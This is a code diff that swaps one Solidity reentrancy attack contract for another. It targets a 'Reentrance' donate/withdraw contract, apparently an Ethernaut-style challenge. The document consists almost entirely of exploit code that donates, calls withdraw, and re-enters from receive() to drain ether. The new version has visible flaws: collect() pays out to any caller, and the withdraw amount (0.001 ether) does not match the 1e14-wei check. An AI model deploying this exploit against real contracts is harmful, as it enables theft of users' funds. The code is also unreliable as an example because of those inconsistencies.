@@ -37,38 +37,38 @@ contract Reentrance {
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 
-
-interface Reentrance {
-    function donate(address _to) external payable;
-    function withdraw(uint256 _amount) external;
+interface Reentrancy {
+    function donate(address) external  payable;
+    function withdraw(uint256) external ;
+    
 }
 
-contract ReentranceAttack {
-    address payable public owner;
-    Reentrance public target;
+contract AttackReentrancy {
 
-    constructor(address _target) public {
-        target = Reentrance(_target);
-        owner = msg.sender;
-    }
+    Reentrancy public target;
 
-    receive() external payable { 
-        require(address(target).balance > 0);
-        target.withdraw(1 ether);
-    }
-
-    function attacker() external payable {
-        require(msg.value >= 1 ether);
-       // Step 1: donate to THIS contract (not owner!)
-        target.donate{value: 1 ether}(address(this));
-       // Step 2: trigger the reentrancy
-        target.withdraw(1 ether);
-    }
-
-    function collect() external {
-        require(msg.sender == owner, "Only owner");
-        owner.transfer(address(this).balance);
+    constructor(address payable _target)public {
+        target = Reentrancy(_target);
         }
+
+    function donate() external  payable{
+        require(msg.value > 0);
+        target.donate{value: 100000000000000}(address(this));
+        }
+    
+    function attack() public{
+        target.withdraw(100000000000000);  
+    }
+
+    receive() external payable {
+        require(address(target).balance >= 100000000000000);
+        target.withdraw(0.001 ether);     
+        }
+    
+    function collect() external {
+        (bool success, ) = msg.sender.call{value: address(this).balance}("");
+        require(success);
+    }
 
 }
 ```
